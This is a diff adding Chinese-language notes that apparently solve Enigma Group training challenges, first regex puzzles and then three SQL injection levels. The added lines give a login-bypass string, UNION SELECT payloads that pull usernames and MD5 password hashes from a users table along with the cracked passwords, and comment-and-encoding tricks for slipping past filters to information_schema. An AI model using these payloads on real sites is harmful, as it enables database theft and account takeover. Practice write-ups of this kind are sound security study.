@@ -16,3 +16,34 @@ CHALLENGES :http://www.enigmagroup.org/
 	reg = new RegExp("^(c|a|b|d)+[^A-Za-df-qs-z]{2}{?[^vCXBhq]*[^pqrst]*[a]+[^passwd]*}?");
 	reg = new RegExp("^.*[k0pst]$");
 	reg = new RegExp("^[^0-9A-Z]{5}$");
+
+    SQL Injection:
+       sql1: 
+            填入：#######' or '1'='1'-- ：成功
+            若填入：#######' or 'a'='a'--：不会成功
+
+       sql2: 重点注意尝试交换查询语句中列名的排列顺序，会获取不同的数据
+            猜测用户表名为users，利用order by来确定表的列数
+            union select 1,2,3 from users order by 3--  users表有三列，猜测列名为username
+            尝试：union select username,2,3 from users--  没有发现有用信息
+                  union select 2,username,3 from users--  输出administrator
+            猜测另一个列名为password
+                  union select 2,username,password from users-- 输出：haZed  4442eaef72feac05644a2a01363c45e2
+                  union select 10 password,username from users-- 输出：6537d34fd1c080b5cb7f06dde3a26fe8  administrator
+            MD5解密就可以获得密码：bl1nd
+
+            通过information_schema获取表名和列名，但是一般会被过滤，下面是一些反过滤措施（但在这个关卡中没有成功绕过）：
+            /*!union%20select*/%201,2,3,4,5,6,7,8%20%20/*!FrOm*/%20information_/*!schema*/./*!tABlEs*/--
+
+            /*!union%20select*/%201,2,3,4,5,6,7,8%20%20/*!FrOm*/%20/*!@69nformation_schema.tables*/--
+
+            /*!union*/%20select%201,2,3,/*!convert*/(column_name%20using%20latin1)%20from%20/*!@69nformation_schema*//*!.columns*/%20where%20table_name="users"--
+
+            and%20substring(@@version,1,1)=4
+
+        sql3: 绕过filter：
+            /*!union*/ select 10,username,password from users-- ：输出administrator  6cfdca6f9633968c72a2a6e0fe2756ca（这个加了两次密）
+            解密后密码：asdfgh
+         
+            
+       
